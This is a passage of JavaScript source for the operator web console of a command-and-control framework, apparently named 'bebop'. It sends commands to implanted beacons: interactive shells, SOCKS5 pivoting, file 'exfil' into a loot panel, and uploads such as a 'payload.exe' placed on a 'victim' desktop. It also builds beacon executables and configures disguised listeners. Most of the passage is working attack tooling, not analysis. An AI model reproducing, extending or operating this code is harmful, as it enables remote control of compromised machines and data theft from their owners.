        if (_beaconModes[_actualBid()] !== 'session') {
            appendLine('[!] shell requires session mode — type "interactive" first', 'err');
        } else {
            openShellTerminal(_actualBid());
        }
        _writePrompt();
        return;
    }

    // ---- SOCKS5 proxy control ----

    if (baseCmd === 'socks5') {
        if (_beaconModes[_actualBid()] !== 'session') {
            appendLine('[!] socks5 requires session mode — type "interactive" first', 'err');
            _writePrompt();
            return;
        }

        const subArgs = cmdArgs.trim().split(/\s+/);
        const subCmd  = subArgs[0] ? subArgs[0].toLowerCase() : '';

        if (subCmd !== 'start' && subCmd !== 'stop') {
            appendLine('[error] usage: socks5 start [port] | socks5 stop', 'err');
            _writePrompt();
            return;
        }

        if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }

        if (subCmd === 'start') {
            const body = { beacon_id: _actualBid() };
            if (subArgs[1]) {
                const p = parseInt(subArgs[1], 10);
                if (isNaN(p) || p < 1 || p > 65535) {
                    appendLine('[error] invalid port — must be 1-65535', 'err');
                    _writePrompt();
                    return;
                }
                body.port = p;
            }
            try {
                const r = await authFetch(tsUrl + '/api/socks', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body),
                });
                if (!r.ok) {
                    const t = await r.text();
                    appendLine('[!] socks5 start failed: ' + t, 'err');
                } else {
                    appendLine('[*] SOCKS5 proxy start requested', 'hint');
                }
            } catch (err) {
                appendLine('[!] socks5 start error: ' + err.message, 'err');
            }
        } else {
            try {
                const r = await authFetch(tsUrl + '/api/socks/' + _actualBid(), { method: 'DELETE' });
                if (!r.ok) {
                    const t = await r.text();
                    appendLine('[!] socks5 stop failed: ' + t, 'err');
                } else {
                    appendLine('[*] SOCKS5 proxy stop requested', 'hint');
                }
            } catch (err) {
                appendLine('[!] socks5 stop error: ' + err.message, 'err');
            }
        }
        _writePrompt();
        return;
    }

    // ---- File transfer builtins ----

    if (baseCmd === 'download') {
        const remotePath = cmd.slice(9).trim();
        if (!remotePath) { appendLine('[error] usage: download <remote_path>', 'err'); _writePrompt(); return; }
        try {
            const resp = await authFetch(tsUrl + '/api/task', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify(Object.assign({ beacon_id: _actualBid(), type: 4, code: 0, args: remotePath }, _isSessionTab() ? {} : { transport: 'http' })),
            });
            if (!resp.ok) appendLine('[error] server returned ' + resp.status, 'err');
            else        { try { const rj = await resp.json(); if (rj.label) _tabLabels[rj.label] = beaconId; } catch(_){} appendLine('[+] exfil queued: ' + remotePath, 'hint'); _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1; }
        } catch (e) { appendLine('[error] ' + e.message, 'err'); }
        _writePrompt();
        return;
    }

    if (baseCmd === 'upload') {
        const destPath = cmd.slice(7).trim();
        if (!destPath) { appendLine('[error] usage: upload <remote_path>', 'err'); appendLine('  e.g. upload C:\\Users\\victim\\Desktop\\payload.exe', 'hint'); _writePrompt(); return; }
        let picker = document.getElementById('upload-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type  = 'file';
            picker.id    = 'upload-picker';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) return;
            const fd = new FormData();
            fd.append('beacon_id', String(_actualBid()));
            fd.append('dest_path', destPath);
            fd.append('file', file);
            try {
                const r = await authFetch(tsUrl + '/api/upload', { method: 'POST', body: fd });
                if (!r.ok) { appendLine('[error] upload failed: ' + r.status, 'err'); return; }
                const j = await r.json();
                if (j.label) _tabLabels[j.label] = beaconId;
                appendLine('[+] upload queued: ' + j.chunks + ' chunk(s) -> ' + destPath, 'hint');
                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
            } catch (e) { appendLine('[error] ' + e.message, 'err'); }
            picker.value = '';
        };
        picker.click();
        _writePrompt();
        return;
    }

    // ---- Generic task dispatch ----

    let taskType = 12; // TaskRun
    let taskCode = 0;  // CodeRunShell
    let taskArgs = cmd;

    if (baseCmd === 'sleep') {
        const sleepParts = cmd.substring(5).trim().split(/\s+/);
        const sec = parseInt(sleepParts[0], 10);
        const jit = sleepParts.length > 1 ? parseInt(sleepParts[1], 10) : 0;
        if (isNaN(sec) || sec < 0 || (sleepParts.length > 1 && (isNaN(jit) || jit < 0 || jit > 100))) {
            appendLine('[error] usage: sleep <seconds> [jitter%]', 'err');
            appendLine('  e.g. sleep 5 20', 'hint');
            _writePrompt(); return;
        }
        taskType = 2; // TaskSet
        taskCode = 0; // CodeSetSleep
        taskArgs = sec + (sleepParts.length > 1 ? ' ' + jit : '');
    } else if (baseCmd === 'exit') {
        taskType = 1; // TaskExit
        taskCode = 0; // CodeExitNormal
        taskArgs = '';
    }

    try {
        const _tb = { beacon_id: _actualBid(), type: taskType, code: taskCode, args: taskArgs };
        if (!_isSessionTab()) _tb.transport = 'http';
        const resp = await authFetch(tsUrl + '/api/task', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(_tb),
        });
        if (!resp.ok) {
            appendLine('[error] server returned ' + resp.status + (resp.status === 404 ? ' (Beacon may not exist anymore)' : ''), 'err');
        } else {
            try { const rj = await resp.json(); if (rj.label) _tabLabels[rj.label] = beaconId; } catch(_){}
            if (!_isSessionTab()) {
                appendLine('[+] task queued', 'hint');
                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
            }
        }
    } catch (e) {
        appendLine('[error] ' + e.message, 'err');
    }
    _writePrompt();
}

// ---- Xterm init ----

function _initXterm(containerId) {
    const el = document.getElementById(containerId);
    if (!el || _term || typeof Terminal === 'undefined') return;

    const term = new Terminal({
        fontFamily:        "'Share Tech Mono', 'Courier New', monospace",
        fontSize:          14,
        letterSpacing:     0.5,
        lineHeight:        1.4,
        cursorBlink:       true,
        cursorStyle:       'block',
        scrollback:        5000,
        scrollSensitivity: 3,
        allowTransparency: true,
        theme: {
            background:          '#000000',
            foreground:          '#d4d4d4',
            cursor:              '#ffb000',
            cursorAccent:        '#000000',
            selectionBackground: 'rgba(255,176,0,0.25)',
            black:   '#000000', red:     '#c84b31',
            green:   '#4a90a4', yellow:  '#ffb000',
            blue:    '#4a90a4', magenta: '#c84b31',
            cyan:    '#4a90a4', white:   '#e8d5a3',
            brightBlack:   '#1e2d3d', brightRed:     '#c84b31',
            brightGreen:   '#4a90a4', brightYellow:  '#ffb000',
            brightBlue:    '#4a90a4', brightMagenta: '#c84b31',
            brightCyan:    '#4a90a4', brightWhite:   '#ffffff',
        },
    });

    const fit = new FitAddon.FitAddon();
    term.loadAddon(fit);
    term.open(el);
    try { fit.fit(); } catch (_) {}

    _term     = term;
    _fitAddon = fit;

    new ResizeObserver(() => { try { fit.fit(); } catch (_) {} }).observe(el);
    term.onData(_handleData);
}

let _termFullscreen = false;

function openFullscreenTerminal() {
    _termFullscreen = !_termFullscreen;
    document.body.classList.toggle('terminal-fullscreen', _termFullscreen);
    setTimeout(() => {
        if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
        if (_shellFit) try { _shellFit.fit(); } catch (_) {}
        if (_term) _term.scrollToBottom();
        if (_shellTerm) _shellTerm.scrollToBottom();
    }, 50);
}

function termFontSize(delta) {
    if (!_term) return;
    const cur = _term.options.fontSize || 14;
    const next = Math.max(8, Math.min(28, cur + delta));
    _term.options.fontSize = next;
    if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
    // Also resize shell xterm if it exists
    if (_shellTerm) {
        _shellTerm.options.fontSize = next;
        if (_shellFit) try { _shellFit.fit(); } catch (_) {}
    }
}

// ---- Poll results ----

async function pollResults() {
    const tsUrl = getTsUrl();
    if (!tsUrl || beaconId === null || isNaN(_actualBid())) return;
    if (_isSessionTab()) return;
    try {
        const sr = await authFetch(tsUrl + '/api/sessions');
        if (sr.ok) {
            const bs = await sr.json();
            const b = bs.find(x => x.id === _actualBid());
            if (b) {
                _lastSeenPrev = b.last_seen;
            }
        }
    } catch (_) {}
    try {
        const resp = await authFetch(tsUrl + `/api/results/${_actualBid()}?since=${pollSince}`);
        if (!resp.ok) return;
        const results = await resp.json();
        let hasNew = false;
        for (const r of (results || [])) {
            if (r.label && !_tabLabels[r.label]) { if (r.received_at > pollSince) pollSince = r.received_at; continue; }
            if (r.label && _tabLabels[r.label] !== beaconId) { if (r.received_at > pollSince) pollSince = r.received_at; continue; }
            if (r.type === 3) {
                appendLine('[+] ' + (r.output || 'upload complete'), 'output');
            } else if (r.type === 4) {
                appendLine('[+] exfil complete: ' + (r.filename || '?'), 'output');
                appendLine('    check the LOOT tab to download or delete', 'hint');
                loadLootPanel();
            } else if (r.type === 2) {
                appendLine('[+] ' + (r.output || 'config updated'), 'hint');
                loadSessions();
            } else {
                appendLine(r.output || '', 'output');
            }
            if (r.received_at > pollSince) pollSince = r.received_at;
            hasNew = true;
        }
        if (hasNew && _term) _term.scrollToBottom();
    } catch (_) {}
}

// ---- Tabbed terminal management ----

const _openTabs = new Map();
const _activeShells = new Set();
const _tabLabels = {};

function _renderTabs() {
    const bar = document.getElementById('terminal-tabs');
    if (!bar) return;
    bar.innerHTML = '';
    for (const [id, tab] of _openTabs) {
        const isShell = typeof id === 'string' && id.startsWith('shell_');
        const isSess  = typeof id === 'string' && id.startsWith('sess_');
        const el = document.createElement('div');
        el.className = 'terminal-tab' + (id === beaconId ? ' active' : '');
        if (isShell) {
            const hostname = escapeHtml(tab.hostname || '?');
            el.innerHTML =
                '<span class="terminal-tab-name" style="color:#AFA9EC"><span style="opacity:0.6;margin-right:5px">$_</span>' + hostname + '</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
        } else if (isSess) {
            const hostname = escapeHtml(tab.hostname || '?');
            el.innerHTML =
                '<span class="terminal-tab-name" style="color:#AFA9EC"><span style="opacity:0.6;margin-right:5px">$_</span>' + hostname + '</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
        } else {
            el.innerHTML =
                '<span class="terminal-tab-name">' + escapeHtml(tab.hostname || '?') + '</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">&times;</span>';
        }
        el.addEventListener('click', (e) => {
            if (e.target.classList.contains('terminal-tab-close')) return;
            _switchTab(id);
        });
        el.querySelector('.terminal-tab-close').addEventListener('click', (e) => {
            e.stopPropagation();
            _closeTab(id);
        });
        bar.appendChild(el);
    }
}

async function _switchTab(id) {
    if (id === beaconId) return;
    const oldId = beaconId;
    const oldIsShell = typeof oldId === 'string' && oldId.startsWith('shell_');
    const newIsShell = typeof id === 'string' && id.startsWith('shell_');

    // Save current tab state
    if (!oldIsShell) {
        _saveBeaconState(oldId);
    }
    if (sessionWs) { sessionWs.close(); sessionWs = null; }

    // Keep shell WebSocket alive when switching tabs — shell runs in background

    beaconId = id;

    const termEl = document.getElementById('terminal');
    const shellEl = document.getElementById('shell-terminal');

    if (newIsShell) {
        // Switching TO a shell tab
        const tab = _openTabs.get(id);
        _activeShellBid = tab ? tab.shellBid : null;

        if (termEl) termEl.style.display = 'none';
        if (!_shellTerm) _initShellXterm();
        if (shellEl) shellEl.style.display = '';

        const entry = _shellWsMap.get(_activeShellBid);
        if (!entry || !entry.ws || entry.ws.readyState !== WebSocket.OPEN) {
            _shellTerm.clear();
            _shellTerm.write('\x1b[2J\x1b[H');
            _shellTerm.write('\x1b[33mReconnecting shell...\x1b[0m\r\n');
            _connectShellWs(_activeShellBid);
        } else if (entry.buffer.length > 0) {
            for (const chunk of entry.buffer) _shellTerm.write(chunk);
            entry.buffer = [];
        }

        if (_shellTerm) { _shellTerm.scrollToBottom(); _shellTerm.focus(); }
        try { _shellFit.fit(); } catch(_) {}
    } else {
        // Switching TO a beacon/session tab
        const isSessTab = typeof id === 'string' && id.startsWith('sess_');
        const numId = isSessTab ? parseInt(id.slice(5), 10) : id;

        if (shellEl) shellEl.style.display = 'none';
        if (termEl) termEl.style.display = '';

        if (_term) {
            _term.clear();
            _term.write('\x1b[2J\x1b[H');
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _outputLog = [];
        }

        if (!_restoreBeaconState(id)) {
            if (!isSessTab) {
                const serverState = await _loadTerminalFromServer(numId);
                if (serverState && serverState.outputLog.length > 0) {
                    _beaconStates[id] = serverState;
                    _restoreBeaconState(id);
                    pollSince = serverState.pollSince || 0;
                }
            } else {
                pollSince = Math.floor(Date.now() / 1000) - 1;
            }
        }

        _writePrompt();

        pollResults();

        if (isSessTab) connectSessionWs(numId);

        setTimeout(() => { if (_term) { _term.scrollToBottom(); _term.focus(); } }, 10);
        if (_fitAddon) try { _fitAddon.fit(); } catch(_) {}
    }

    _renderTabs();
    _saveTabs();
}

function _closeTab(id) {
    const isShell = typeof id === 'string' && id.startsWith('shell_');

    // Close shell WebSocket but keep shell process alive on beacon
    if (isShell) {
        const tab = _openTabs.get(id);
        const bid = tab ? tab.shellBid : null;
        if (bid) {
            const entry = _shellWsMap.get(bid);
            if (entry && entry.ws) entry.ws.close();
            _shellWsMap.delete(bid);
        }
        _activeShellBid = null;
    }

    _openTabs.delete(id);

    if (id === beaconId) {
        if (sessionWs) { sessionWs.close(); sessionWs = null; }
        beaconId = null;

        // Hide shell terminal, show beacon terminal
        const shellEl = document.getElementById('shell-terminal');
        const termEl = document.getElementById('terminal');
        if (shellEl) shellEl.style.display = 'none';
        if (termEl) termEl.style.display = '';

        if (_openTabs.size > 0) {
            const nextId = _openTabs.keys().next().value;
            _switchTab(nextId);
        } else {
            document.body.classList.remove('panel-open');
            if (_term) {
                _term.clear();
                _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
                _outputLog = [];
            }
            _renderTabs();
        }
    } else {
        _renderTabs();
    }
    _saveTabs();
}

async function openTerminal(id) {
    const isSession = typeof id === 'string' && id.startsWith('sess_');
    const actualId = isSession ? parseInt(id.slice(5), 10) : id;

    if (!_term) _initXterm('terminal');

    if (_openTabs.has(id)) {
        _switchTab(id);
        document.body.classList.add('panel-open');
        _saveTabs();
        return;
    }

    // If coming from a shell tab, swap visibility (keep WS alive in background)
    const oldIsShell = typeof beaconId === 'string' && beaconId.startsWith('shell_');
    if (oldIsShell) {
        const shellEl = document.getElementById('shell-terminal');
        const termEl = document.getElementById('terminal');
        if (shellEl) shellEl.style.display = 'none';
        if (termEl) termEl.style.display = '';
    }

    _saveBeaconState(beaconId);

    beaconId = id;

    if (_term) {
        _term.clear();
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _outputLog = [];
    }

    document.body.classList.add('panel-open');

    if (!isSession) {
        const serverState = await _loadTerminalFromServer(actualId);
        if (serverState && serverState.outputLog.length > 0) {
            _beaconStates[id] = serverState;
            _restoreBeaconState(id);
            pollSince = serverState.pollSince || 0;
        } else {
            pollSince = Math.floor(Date.now() / 1000) - 1;
            _promptVisible = false;
            appendLine('Type "help" to list available commands.', 'hint');
        }
    } else {
        pollSince = Math.floor(Date.now() / 1000) - 1;
        if (_term) { _term.clear(); _term.write('\x1b[2J\x1b[H'); }
        _outputLog = []; _promptVisible = false;
        appendLine('\x1b[36mSession terminal — commands routed via TCP (real-time).\x1b[0m', 'info');
        appendLine('Type "help" to list available commands.', 'hint');
        connectSessionWs(actualId);
    }
    _writePrompt();
    if (_term) { _term.scrollToBottom(); _term.focus(); }

    const _bid = (typeof id === 'string' && id.startsWith('sess_')) ? parseInt(id.slice(5), 10) :
                 (typeof id === 'string' && id.startsWith('shell_')) ? parseInt(id.slice(6), 10) : id;
    const _cached = _beacons && _beacons[_bid];
    _openTabs.set(id, { hostname: (_cached && _cached.hostname) || '?' });
    _fetchTabHostname(id);
    _renderTabs();
    _saveTabs();

    pollResults();
}

function _refreshOpenTabHostnames() {
    if (!_beacons || _openTabs.size === 0) return;
    let changed = false;
    for (const [id, tab] of _openTabs) {
        let actualId;
        if (typeof id === 'string' && id.startsWith('sess_'))       actualId = parseInt(id.slice(5), 10);
        else if (typeof id === 'string' && id.startsWith('shell_')) actualId = parseInt(id.slice(6), 10);
        else                                                        actualId = id;
        const b = _beacons[actualId];
        if (b && b.hostname && tab.hostname !== b.hostname) {
            tab.hostname = b.hostname;
            changed = true;
        }
    }
    if (changed) { _renderTabs(); _saveTabs(); }
}

async function _fetchTabHostname(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    let actualId;
    if (typeof id === 'string' && id.startsWith('sess_'))       actualId = parseInt(id.slice(5), 10);
    else if (typeof id === 'string' && id.startsWith('shell_')) actualId = parseInt(id.slice(6), 10);
    else                                                        actualId = id;
    try {
        const resp = await authFetch(tsUrl + '/api/sessions');
        const beacons = await resp.json();
        const b = beacons.find(x => x.id === actualId);
        if (!b) return;
        const tab = _openTabs.get(id);
        if (tab && b.hostname) {
            tab.hostname = b.hostname;
            _renderTabs();
            _saveTabs();
        }
        _beaconModes[actualId] = b.mode || 'beacon';
        if (b.mode === 'session' && _isSessionTab()) {
            connectSessionWs(actualId);
        }
    } catch (_) {}
}

function closeTerminal() {
    _saveBeaconState(beaconId);
    document.body.classList.remove('panel-open');
    if (sessionWs) { sessionWs.close(); sessionWs = null; }
    beaconId = null;
    _saveTabs();
}

window.addEventListener('beforeunload', () => {
    if (beaconId != null && _term && !(typeof beaconId === 'string' && beaconId.startsWith('shell_'))) {
        _beaconStates[beaconId] = {
            outputLog: _outputLog.slice(),
            cmdHistory: cmdHistory.slice(),
            pollSince: pollSince,
        };
        const tsUrl = getTsUrl();
        if (tsUrl) {
            const state = _beaconStates[beaconId];
            const blob = new Blob([JSON.stringify({
                output_log: state.outputLog,
                cmd_history: state.cmdHistory,
                poll_since: state.pollSince,
            })], { type: 'text/plain' });
            navigator.sendBeacon(tsUrl + '/api/terminal/' + beaconId, blob);
        }
    }
    if (document.getElementById('sessions-table-view') !== null) _saveTabs();
});

// ---- Build page ----

function showBuildStatus(msg, cls) {
    const el = document.getElementById('build-status');
    if (!el) return;
    el.textContent = msg;
    el.className = 'build-status ' + (cls || '');
}

async function populateBuildListeners() {
    const tsUrl = getTsUrl();
    const sel = document.getElementById('buildListener');
    if (!sel) return;
    if (!tsUrl) { sel.innerHTML = '<option value="">— connect to teamserver first —</option>'; return; }

    try {
        const resp = await authFetch(tsUrl + '/api/listeners');
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        const listeners = await resp.json();
        sel.innerHTML = '<option value="">— select a listener —</option>';
        for (const l of (listeners || [])) {
            const opt = document.createElement('option');
            opt.value = l.id;
            const certNote = l.scheme === 'https' ? (l.auto_cert ? ' [self-signed]' : ' [custom cert]') : '';
            opt.textContent = l.name + ' — ' + l.scheme + '://' + (l.host || '?') + ':' + l.port + certNote;
            if (!l.host) opt.disabled = true;
            sel.appendChild(opt);
        }
    } catch (e) {
        sel.innerHTML = '<option value="">— could not load listeners —</option>';
    }
}

function onListenerSelect(sel) {
    const hint = document.getElementById('listener-preview');
    if (!hint) return;
    const opt = sel.options[sel.selectedIndex];
    hint.textContent = opt && opt.value ? opt.textContent : '';
}

async function buildBeacon() {
    const tsUrl = getTsUrl();
    if (!tsUrl) {
        showBuildStatus('Enter teamserver address and click Connect first.', 'err');
        return;
    }

    const sel        = document.getElementById('buildListener');
    const listenerId = sel ? parseInt(sel.value, 10) : NaN;
    const sleepDays  = parseInt(document.getElementById('buildSleepDays').value,  10) || 0;
    const sleepHours = parseInt(document.getElementById('buildSleepHours').value, 10) || 0;
    const sleepMins  = parseInt(document.getElementById('buildSleepMins').value,  10) || 0;
    const sleepSecs  = parseInt(document.getElementById('buildSleepSecs').value,  10) || 0;
    const sleepMs    = Math.max(1000, (sleepDays * 86400 + sleepHours * 3600 + sleepMins * 60 + sleepSecs) * 1000);
    const jitter     = parseInt(document.getElementById('buildJitter').value, 10);
    const format     = document.getElementById('buildFormat')?.value || 'exe';

    if (!listenerId || isNaN(listenerId)) {
        showBuildStatus('Select a listener first.', 'err');
        return;
    }

    const btn      = document.getElementById('build-btn');
    const filename = format === 'bin' ? 'beacon.bin' : 'beacon.exe';
    btn.disabled = true;
    showBuildStatus('3, 2, 1, let\'s jam\u2026 compiling ' + filename, '');

    try {
        const resp = await authFetch(tsUrl + '/api/build', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({
                listener_id: listenerId,
                sleep_ms:    sleepMs,
                jitter_pct:  isNaN(jitter) ? 20 : jitter,
                format:      format,
                session_port: 4443,
            })
        });
        if (!resp.ok) {
            const text = await resp.text();
            showBuildStatus('Build failed: ' + text, 'err');
            return;
        }
        const blob = await resp.blob();
        const url  = URL.createObjectURL(blob);
        const a    = document.createElement('a');
        a.href     = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showBuildStatus(filename + ' ready \u2014 download started.', 'ok');
    } catch (e) {
        showBuildStatus('Error: ' + e.message, 'err');
    } finally {
        btn.disabled = false;
    }
}

// ---- Listeners page ----

async function loadListeners() {
    const tsUrl = getTsUrl();
    const tbody = document.getElementById('listeners-tbody');
    const noMsg = document.getElementById('no-listeners');
    const count = document.getElementById('listener-count');
    if (!tbody) return;

    if (!tsUrl) {
        tbody.innerHTML = '';
        if (noMsg) { noMsg.style.display = ''; }
        updateConnIndicator(false);
        return;
    }

    try {
        const resp = await authFetch(tsUrl + '/api/listeners');
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        const listeners = await resp.json();

        updateConnIndicator(true);
        if (count) count.textContent = listeners.length ? '// ' + listeners.length + ' active' : '';

        if (!listeners || listeners.length === 0) {
            tbody.innerHTML = '';
            if (noMsg) noMsg.style.display = '';
            return;
        }
        if (noMsg) noMsg.style.display = 'none';

        tbody.innerHTML = '';
        listeners.forEach((l, i) => {
            const tr = document.createElement('tr');
            tr.style.animationDelay = (i * 0.04) + 's';
            tr.style.cursor = 'context-menu';

            const schemeBadge = '<span class="listener-badge badge-' + l.scheme + '">' + l.scheme.toUpperCase() + '</span>';
            const certBadge   = l.scheme === 'https'
                ? (l.auto_cert
                    ? '<span class="listener-badge badge-autocert">self-signed</span>'
                    : '<span class="listener-badge badge-realcert">custom</span>')
                : '<span style="color:var(--text-dim);font-family:\'Share Tech Mono\',monospace;font-size:11px;">—</span>';

            tr.innerHTML =
                '<td style="color:var(--text-dim);">' + l.id + '</td>' +
                '<td>' + escapeHtml(l.name) + '</td>' +
                '<td>' + schemeBadge + '</td>' +
                '<td style="font-family:\'Share Tech Mono\',monospace;">' + escapeHtml(l.host || '—') + '</td>' +
                '<td>' + l.port + '</td>' +
                '<td>' + certBadge + '</td>';
            tr.addEventListener('contextmenu', (e) => { e.preventDefault(); showListenerContextMenu(e, l); });
            tbody.appendChild(tr);
        });
    } catch (e) {
        if (noMsg) {
            noMsg.innerHTML = 'Cannot reach teamserver — ' + escapeHtml(e.message) +
                '<span style="display:block;font-style:italic;font-size:11px;margin-top:8px;opacity:0.6;">"The music\'s over. Try again."</span>';
            noMsg.style.display = '';
        }
        tbody.innerHTML = '';
        updateConnIndicator(false);
    }
}

function showListenerContextMenu(e, listener) {
    const menu = document.getElementById('listener-context-menu');
    if (!menu) return;
    const del = document.getElementById('ctx-listener-delete');
    if (del) {
        del.textContent = listener.is_default ? 'Default (cannot delete)' : 'Delete Listener';
        del.style.opacity = listener.is_default ? '0.4' : '';
        del.onclick = listener.is_default ? null : () => {
            confirmDeleteListener(listener.id, listener.name);
            menu.style.display = 'none';
        };
    }
    menu.style.display = 'block';
    const mx = Math.min(e.clientX, window.innerWidth - menu.offsetWidth - 8);
    const my = Math.min(e.clientY, window.innerHeight - menu.offsetHeight - 8);
    menu.style.left = mx + 'px';
    menu.style.top = my + 'px';
}

document.addEventListener('click', () => {
    const menu = document.getElementById('listener-context-menu');
    if (menu) menu.style.display = 'none';
});

let _deleteListenerId = null;

function confirmDeleteListener(id, name) {
    _deleteListenerId = id;
    const el = document.getElementById('delete-listener-target');
    if (el) el.textContent = name || ('listener #' + id);
    const modal = document.getElementById('delete-listener-modal');
    if (modal) modal.style.display = 'flex';
}

function cancelDeleteListener() {
    _deleteListenerId = null;
    const modal = document.getElementById('delete-listener-modal');
    if (modal) modal.style.display = 'none';
}

function execDeleteListener() {
    const id = _deleteListenerId;
    cancelDeleteListener();
    if (id == null) return;
    deleteListenerById(id);
}

async function deleteListenerById(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/listeners/' + id, { method: 'DELETE' });
        if (!resp.ok) throw new Error(await resp.text());
        loadListeners();
    } catch (e) {
        alert('Delete failed: ' + e.message);
    }
}

function showCreateModal() {
    const tsUrl = getTsUrl();
    if (!tsUrl) { alert('Connect to teamserver first.'); return; }
    
    // Clear fields safely
    const fields = ['ln-name', 'ln-host', 'ln-port', 'ln-cert', 'ln-key'];
    fields.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.value = '';
    });

    const radios = document.querySelectorAll('input[name="ln-scheme"]');
    radios.forEach(r => { r.checked = r.value === 'http'; });

    const httpsFields = document.getElementById('https-fields');
    if (httpsFields) httpsFields.style.display = 'none';

    const headerList = document.getElementById('custom-headers-list');
    if (headerList) headerList.innerHTML = '';

    const statusEl = document.getElementById('create-status');
    if (statusEl) statusEl.textContent = '';

    const modal = document.getElementById('create-modal');
    if (modal) modal.style.display = 'flex';
}

function hideCreateModal() {
    const modal = document.getElementById('create-modal');
    if (modal) modal.style.display = 'none';
}

function onSchemeChange(el) {
    const isHttps = el.value === 'https';
    const httpsFields = document.getElementById('https-fields');
    if (httpsFields) httpsFields.style.display = isHttps ? '' : 'none';
    
    if (!isHttps) {
        const cert = document.getElementById('ln-cert');
        const key = document.getElementById('ln-key');
        if (cert) cert.value = '';
        if (key) key.value = '';
    }
}

function addHeaderRow() {
    const list = document.getElementById('custom-headers-list');
    if (!list) return;
    const pair = document.createElement('div');
    pair.className = 'header-pair';
    pair.innerHTML =
        '<input type="text" class="form-input-inline" placeholder="Header Name (e.g. Server)" title="Header name">' +
        '<input type="text" class="form-input-inline" placeholder="Value (e.g. nginx)" title="Header value">' +
        '<button type="button" class="btn-action-small" onclick="this.parentElement.remove()" style="border-color:var(--border-orange); color:var(--orange); min-width:32px;">&#x2715;</button>';
    list.appendChild(pair);
}

async function submitCreateListener() {
    const nameEl = document.getElementById('ln-name');
    const hostEl = document.getElementById('ln-host');
    const portEl = document.getElementById('ln-port');
    const certEl = document.getElementById('ln-cert');
    const keyEl  = document.getElementById('ln-key');
    const statusEl = document.getElementById('create-status');
    const schemeEl = document.querySelector('input[name="ln-scheme"]:checked');

    if (!nameEl || !hostEl || !portEl || !statusEl || !schemeEl) return;

    const name    = nameEl.value.trim();
    const scheme  = schemeEl.value;
    const host    = hostEl.value.trim();
    const port    = parseInt(portEl.value, 10);
    const certPem = certEl ? certEl.value.trim() : '';
    const keyPem  = keyEl ? keyEl.value.trim() : '';

    if (!name) { statusEl.textContent = 'name is required'; return; }
    if (!host) { statusEl.textContent = 'host is required'; return; }
    if (!port || port < 1 || port > 65535) { statusEl.textContent = 'valid port required (1-65535)'; return; }

    const customHeaders = {};
    document.querySelectorAll('#custom-headers-list .header-pair').forEach(pair => {
        const inputs = pair.querySelectorAll('input');
        if (inputs.length >= 2) {
            const k = inputs[0].value.trim();
            const v = inputs[1].value.trim();
            if (k) customHeaders[k] = v;
        }
    });

    const payload = {
        name,
        scheme,
        host,
        bind_addr: '0.0.0.0', // Fixed value
        port,
        cert_pem:  certPem,
        key_pem:   keyPem,
        custom_headers: Object.keys(customHeaders).length ? customHeaders : null,
    };

    const tsUrl = getTsUrl();
    try {
        const resp = await authFetch(tsUrl + '/api/listeners', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(payload),
        });
        if (!resp.ok) {
            statusEl.textContent = 'Error: ' + (await resp.text());
            return;
        }
        hideCreateModal();
        loadListeners();
    } catch (e) {
        statusEl.textContent = 'Error: ' + e.message;
    }
}

// ---- Visibility change — pause/resume polling ----

document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        // nothing to clear — WebSocket handles real-time updates
    } else {
        if (!_operatorWs || _operatorWs.readyState !== WebSocket.OPEN) {
            connectOperatorWs();
        }
    }
});

// ---- Init ----

if (document.getElementById('sessions-table-view') !== null) {
    if (!checkAuth()) { /* redirecting to /login */ }
    else {
    initSettings();
    connectOperatorWs();

    ['tsIp', 'tsPort'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('keydown', e => { if (e.key === 'Enter') saveSettings(); });
    });

    // Restore terminal panel height
    const savedHeight = localStorage.getItem('bebop_termHeight');
    if (savedHeight) document.documentElement.style.setProperty('--terminal-height', savedHeight);

    // Restore persisted tabs/terminal state from server
    const _restoredActiveId = _loadTabs();
    const _panelWasOpen = localStorage.getItem('bebop_panelOpen') !== '0';
    if (_restoredActiveId != null && _openTabs.size > 0 && _panelWasOpen) {
        if (!_term) _initXterm('terminal');
        beaconId = _restoredActiveId;
        document.body.classList.add('panel-open');
        _renderTabs();
        _loadTerminalFromServer(_restoredActiveId).then(serverState => {
            if (serverState && serverState.outputLog.length > 0) {
                _beaconStates[_restoredActiveId] = serverState;
                _restoreBeaconState(_restoredActiveId);
                pollSince = serverState.pollSince || 0;
            }
            _writePrompt();
            if (_term) { _term.scrollToBottom(); _term.focus(); }
        });
    }
    }
}

if (document.getElementById('build-btn') !== null) {
    if (!checkAuth()) { /* redirecting to /login */ }
    else {
        initSettings();
        populateBuildListeners();
    }
}

// ---- Log panel tab switching (events / loot) ----

let _activeLogTab = 'events';

function switchLogTab(tab) {
    _activeLogTab = tab;
    const evBody   = document.getElementById('event-log-body');
    const lootBody = document.getElementById('loot-log-body');
    const chatBody = document.getElementById('chat-log-body');
    if (!evBody || !lootBody) return;

